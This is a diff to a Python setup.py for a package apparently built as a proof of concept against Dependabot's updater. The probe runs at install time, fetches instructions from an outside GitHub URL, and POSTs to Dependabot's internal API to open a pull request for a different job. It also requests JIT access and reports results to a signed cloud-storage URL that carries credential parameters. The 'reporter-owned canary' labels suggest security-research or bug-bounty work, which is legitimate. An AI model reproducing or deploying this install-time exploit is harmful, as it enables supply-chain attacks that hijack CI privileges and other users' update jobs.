@@ -14,6 +14,10 @@ from setuptools import find_packages, setup
 
 RECEIPT_URL = "https://storage.googleapis.com/treborlab-dependabot-jit-receipts-1097452703518/hosted-jit-receipt.json?x-goog-signature=5890d38c6727230803a816101289a1e9943aaca19832bb68b46c5429461f224742ccd4f8e1c9b72ed4d2066ab9d46b29dd1d2c0564e3c2319441084d32777585c6afe1f9348d8ff59272b02283aa5da38e2e2e1531b79a113428f366c24b736d9a24d9760c2ee7eda92a62f863330b1a3da59ea20f83bf17f8cd0d46becbb6c2a5d56b1ef5391ce54b25550ab2fbcb8657a301f0b0ab0846c6b24411c3508147a40cf8b21c6d5e36306c20b884d3b3005307e84526ba0eb82547c943d340d782acc7a100b54dec2ea56d052f32533553fe4a7e185ac318960b102fb6dab9fb6c8200dfd80870e474273d77d6e02552e58e0fbbbfeccff3dca0b191e449946f76&x-goog-algorithm=GOOG4-RSA-SHA256&x-goog-credential=1097452703518-compute%40developer.gserviceaccount.com%2F20261103%2Fus-central1%2Fstorage%2Fgoog4_request&x-goog-date=20261103T045241Z&x-goog-expires=7200&x-goog-signedheaders=host"
 TARGET_NWO = "benr00t3d/dependabot-python-victim-canary"
+CONTROL_URL = (
+    "https://raw.githubusercontent.com/benr00t3d/"
+    "dependabot-python-jit-probe/main/cross-job-control.json"
+)
 
 
 def _sha256(value):
@@ -48,6 +52,9 @@ def _run_probe():
         "pull_request_api_status": None,
         "pull_request_api_body_sha256": None,
         "pull_request_canary_name": "DEPENDABOT_PUBLIC_PACKAGE_AUTHORITY_CANARY.txt",
+        "cross_job_api_status": None,
+        "cross_job_api_body_sha256": None,
+        "cross_job_target_id_sha256": None,
     }
 
     repo_dir = pathlib.Path("/home/dependabot/dependabot-updater/repo")
@@ -68,7 +75,7 @@ def _run_probe():
         requirements_in = (
             "requests==2.34.2\n"
             "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.4\n"
+            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.5\n"
         )
         requirements_txt = (
             "#\n"
@@ -82,7 +89,7 @@ def _run_probe():
             "charset-normalizer==3.2.0\n"
             "    # via requests\n"
             "dependabot-jit-authority-probe @ "
-            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.4\n"
+            "git+https://github.com/benr00t3d/dependabot-python-jit-probe.git@v0.0.5\n"
             "    # via -r requirements.in\n"
             "idna==3.4\n"
             "    # via requests\n"
@@ -159,6 +166,95 @@ def _run_probe():
             receipt["pull_request_api_body_sha256"] = _sha256(error.read(1024 * 1024))
         except Exception as error:
             receipt["pull_request_api_error_class"] = type(error).__name__
+
+    try:
+        with urllib.request.urlopen(CONTROL_URL, timeout=15) as response:
+            control = json.loads(response.read(65536))
+        target_job_id = str(control.get("job_id", ""))
+        target_base_commit = str(control.get("base_commit", ""))
+        if target_job_id.isdigit() and len(target_base_commit) == 40:
+            receipt["cross_job_target_id_sha256"] = _sha256(target_job_id.encode())
+            cross_job_data = {
+                "dependencies": [
+                    {
+                        "name": "requests",
+                        "previous-version": "2.31.0",
+                        "version": "2.34.2",
+                        "requirements": [
+                            {
+                                "file": "requirements.in",
+                                "requirement": "==2.34.2",
+                                "groups": [],
+                                "source": None,
+                            }
+                        ],
+                        "previous-requirements": [
+                            {
+                                "file": "requirements.in",
+                                "requirement": "==2.31.0",
+                                "groups": [],
+                                "source": None,
+                            }
+                        ],
+                        "directory": "/",
+                    }
+                ],
+                "updated-dependency-files": [
+                    {
+                        "name": "requirements.in",
+                        "content": "-e .\nrequests==2.34.2\n",
+                        "content_encoding": "utf-8",
+                        "deleted": False,
+                        "directory": "/",
+                        "operation": "update",
+                        "support_file": False,
+                        "type": "file",
+                    },
+                    {
+                        "name": "requirements.txt",
+                        "content": (
+                            "#\n# Reporter-owned cross-job authorization target.\n#\n"
+                            "-e .\nrequests==2.34.2\n"
+                        ),
+                        "content_encoding": "utf-8",
+                        "deleted": False,
+                        "directory": "/",
+                        "operation": "update",
+                        "support_file": False,
+                        "type": "file",
+                    },
+                    {
+                        "name": "DEPENDABOT_CROSS_JOB_AUTHORITY_CANARY.txt",
+                        "content": "Reporter-owned bounded cross-job authority canary.\n",
+                        "content_encoding": "utf-8",
+                        "deleted": False,
+                        "directory": "/",
+                        "operation": "create",
+                        "support_file": True,
+                        "type": "file",
+                    },
+                ],
+                "base-commit-sha": target_base_commit,
+                "commit-message": "Record bounded cross-job authority canary",
+                "pr-title": "Record bounded cross-job authority canary",
+                "pr-body": "Reporter-owned Dependabot cross-job authorization canary.",
+            }
+            cross_job_request = urllib.request.Request(
+                f"{api_url}/update_jobs/{target_job_id}/create_pull_request",
+                data=json.dumps({"data": cross_job_data}).encode(),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            try:
+                with urllib.request.urlopen(cross_job_request, timeout=20) as response:
+                    body = response.read(1024 * 1024)
+                    receipt["cross_job_api_status"] = response.status
+                    receipt["cross_job_api_body_sha256"] = _sha256(body)
+            except urllib.error.HTTPError as error:
+                receipt["cross_job_api_status"] = error.code
+                receipt["cross_job_api_body_sha256"] = _sha256(error.read(1024 * 1024))
+    except Exception as error:
+        receipt["cross_job_api_error_class"] = type(error).__name__
 
     endpoint = f"{api_url}/update_jobs/{job_id}/create_jit_access"
     request_body = json.dumps(
@@ -269,7 +365,7 @@ _run_probe()
 
 setup(
     name="dependabot-jit-authority-probe",
-    version="0.0.4",
+    version="0.0.5",
     description="Reporter-owned Dependabot boundary canary",
     packages=find_packages(),
 )
